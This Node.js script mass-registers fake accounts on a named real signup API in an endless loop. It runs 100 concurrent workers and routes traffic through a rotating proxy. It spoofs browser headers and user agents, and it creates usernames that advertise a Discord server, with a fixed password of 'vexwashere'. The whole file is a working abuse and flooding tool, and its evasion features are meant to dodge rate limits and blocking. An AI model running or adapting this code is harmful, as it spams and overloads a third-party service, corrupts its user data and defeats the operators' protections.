const fetch = require('node-fetch');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fs = require('fs').promises;

const url = "https://api.enclicainteractive.com/api/signup";
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
];

const password = "vexwashere";
const proxyUrl = "<rotating_proxy_url>";
const proxyAgent = new HttpsProxyAgent(proxyUrl);
const concurrency = 100; 
const requestQueue = [];

function generateRandomUsername() {
    const randomNumbers = Math.floor(100000000000 + Math.random() * 900000000000);
    return `discord.gg/vexhub_${randomNumbers}`;
}

function generateRandomEmail() {
    const randomNumbers = Math.floor(100000000000 + Math.random() * 900000000000);
    return `discord.gg_vexhub_${randomNumbers}@outlook.com`;
}
async function sendRequest() {
    const username = generateRandomUsername();
    const email = generateRandomEmail();
    const headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache",
        "content-type": "application/json",
        "pragma": "no-cache",
        "sec-ch-ua": "\"Opera GX\";v=\"109\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"123\"",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "\"Windows\"",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "referer": "https://enclicainteractive.com/",
        "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)]
    };
    const payload = {
        "username": username,
        "email": email,
        "password": password
    };

    try {
        console.log(`Sending request with username: ${username}, email: ${email}`);
        const response = await fetch(url, {
            method: 'POST',
            headers: headers,
            body: JSON.stringify(payload),
            agent: proxyAgent
        });

        const responseData = await response.json();
        console.log(`Status Code: ${response.status}, Response: ${JSON.stringify(responseData, null, 2)}`);
        
        await fs.appendFile('request_log.txt', `Username: ${username}, Email: ${email}, Password: ${password}, Status Code: ${response.status}\n`);
    } catch (error) {
        console.log(`Request failed for username: ${username}, email: ${email}`);
        await fs.appendFile('request_log.txt', `Username: ${username}, Email: ${email}, Password: ${password}, Error: ${error.message}\n`);
    }
}

async function worker() {
    while (true) {
        const task = requestQueue.pop();
        if (task) {
            await task();
        } else {
            await new Promise(resolve => setTimeout(resolve, 100)); // Wait for tasks to be added
        }
    }
}

async function main() {
    for (let i = 0; i < concurrency; i++) {
        worker();
    }

    while (true) {
        requestQueue.push(sendRequest);
        await new Promise(resolve => setTimeout(resolve, 100)); // Adjust delay as needed
    }
}

main();
